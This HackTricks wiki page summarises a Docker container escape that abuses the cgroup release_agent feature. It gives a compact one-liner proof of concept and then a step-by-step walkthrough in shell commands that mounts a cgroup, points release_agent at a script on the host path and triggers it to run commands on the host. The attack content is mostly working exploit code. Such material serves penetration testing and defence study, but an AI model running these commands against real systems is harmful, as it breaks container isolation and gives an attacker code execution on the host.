# Docker release\_agent cgroups escape

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}


**For further details, refer to the** [**original blog post**](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)**.** This is just a summary:

Original PoC:

```shell
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 >$d/w/notify_on_release
t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
```

The proof of concept (PoC) demonstrates a method to exploit cgroups by creating a `release_agent` file and triggering its invocation to execute arbitrary commands on the container host. Here's a breakdown of the steps involved:

1. **Prepare the Environment:**
   * A directory `/tmp/cgrp` is created to serve as a mount point for the cgroup.
   * The RDMA cgroup controller is mounted to this directory. In case of absence of the RDMA controller, it's suggested to use the `memory` cgroup controller as an alternative.

```shell
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

2. **Set Up the Child Cgroup:**
   * A child cgroup named "x" is created within the mounted cgroup directory.
   * Notifications are enabled for the "x" cgroup by writing 1 to its notify\_on\_release file.

```shell
echo 1 > /tmp/cgrp/x/notify_on_release
```

3. **Configure the Release Agent:**
   * The path of the container on the host is obtained from the /etc/mtab file.
   * The release\_agent file of the cgroup is then configured to execute a script named /cmd located at the acquired host path.

```shell
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
```

4. **Create and Configure the /cmd Script:**
   * The /cmd script is created inside the container and is configured to execute ps aux, redirecting the output to a file named /output in the container. The full path of /output on the host is specified.

```shell
echo '#!/bin/sh' > /cmd
echo "ps aux > $host_path/output" >> /cmd
chmod a+x /cmd
```

5. **Trigger the Attack:**
   * A process is initiated within the "x" child cgroup and is immediately terminated.
   * This triggers the `release_agent` (the /cmd script), which executes ps aux on the host and writes the output to /output within the container.

```shell
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
```

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

